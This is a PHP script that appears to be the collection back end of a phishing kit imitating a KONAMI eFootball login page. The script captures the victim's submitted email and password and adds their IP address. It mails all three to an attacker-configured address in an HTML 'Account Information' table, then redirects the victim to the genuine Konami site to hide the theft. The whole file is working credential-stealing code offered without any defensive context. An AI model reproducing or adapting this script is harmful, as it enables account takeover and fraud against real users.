<?php
// TAKE CONTROL
include 'system/setting.php';
include 'system/geolocation.php';
include 'email.php'; //TEMPAT EMAIL

// CAPTURE INPUTED DATA
$email = $_POST['email'];
$password = $_POST['password'];

if($email == "" && $password == ""){
header("Location: index.php");
}else{

// ACCOUNT RESULT CONTENT
$subjek = "$resultFlags | KONAMI | PUNYA $email";
$pesan = '
<center> 
<div style="background: url(https://www.gamereactor.asia/media/58/efootballpes2021_3245803b.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
<div style="background: rgba(0, 0, 0, 0.4); width: 100%; height: 100%; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
</div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Account Information</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>KONAMI ID</th>
<th style="width:78%;text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>PASSWORD</th>
<th style="width:78%;text-align: center;"><b>'.$password.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Additional information</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ip address</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['query'].'</th> 
</tr>
</table>
</div>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);

echo '<script>window.location.replace("https://www.konami.com/wepes/mobile/en/")</script>';
}
?>